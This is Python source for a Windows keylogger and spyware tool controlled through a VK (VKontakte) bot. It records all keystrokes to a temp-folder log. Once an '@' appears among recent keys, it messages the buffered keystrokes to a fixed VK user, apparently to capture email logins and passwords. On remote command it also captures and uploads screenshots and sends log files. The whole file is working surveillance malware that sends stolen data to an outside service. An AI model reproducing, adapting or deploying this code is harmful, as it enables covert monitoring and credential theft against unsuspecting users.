import vk_api, io, requests
from vk_api.upload import VkUpload
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
from datetime import datetime
from PIL import ImageGrab, Image
from vk_api.utils import get_random_id
from pynput.keyboard import Listener, _win32, Key
import logging
from threading import Thread


ID = '1'
vk_session = vk_api.VkApi(token="token")
longpoll = VkBotLongPoll(vk_session, "181945713")
vk = vk_session.get_api()


def screen_shot():
    im = ImageGrab.grab()
    fp = io.BytesIO()
    im.save(fp, 'JPEG')
    fp.seek(0)
    return fp.getvalue()


def send_file(doc, id):
    upload = VkUpload(vk_session)
    up_info = upload.document_message(doc, '', 'logs', '288345074')
    d = f'doc{up_info["doc"]["owner_id"]}_{up_info["doc"]["id"]}'
    vk.messages.send(
        peer_id=id,
        random_id=get_random_id(),
        message=f'Screen ID: {ID} | Time: {datetime.strftime(datetime.now(), "%H:%M %d.%m ")}',
        attachment=d,
    )


def send_photo(photo, id):
    a = vk.photos.getMessagesUploadServer()
    b = requests.post(a['upload_url'], files={'photo': ('screenshot.png', screen_shot(), 'image/png')}).json()
    print(b)
    c = vk.photos.saveMessagesPhoto(server=b['server'], photo=b['photo'], hash=b['hash'])[0]
    d = f'photo{c["owner_id"]}_{c["id"]}'
    vk.messages.send(
        peer_id=id,
        random_id=get_random_id(),
        attachment=d,
    )


log_dir = 'C:/Windows/Temp/'
logs = []
logging.basicConfig(filename=(log_dir+'key_log.txt'), level=logging.DEBUG, format='%(message)s')

count = 0


def on_press(key):
    global logs, count

    if len(logs) > 100:
        logs.pop(0)
    logging.info(str(key))
    # if type(key) is _win32.KeyCode:
    #     logs.append(key)
    # else:
    #     logs.append(str(key))
    logs.append(str(key))
    if "'@'" in logs:
        count += 1
        if count == 50:
            send_message(logs)
            count = 0


def Log():
    with Listener(on_press=on_press) as listener:
        listener.join()


def send_message(text):
    vk.messages.send(
        user_id='288345074',
        random_id=get_random_id(),
        message=text)


a = Thread(target=Log)
a.start()



for event in longpoll.listen():
    if event.type == VkBotEventType.MESSAGE_NEW:
        if event.obj.text != '':
            if event.message['text'] == 'screen':
                send_photo(screen_shot(), event.message['from_id'])
            if event.message['text'] == 'log':
                send_file('1.txt', event.message['from_id'])

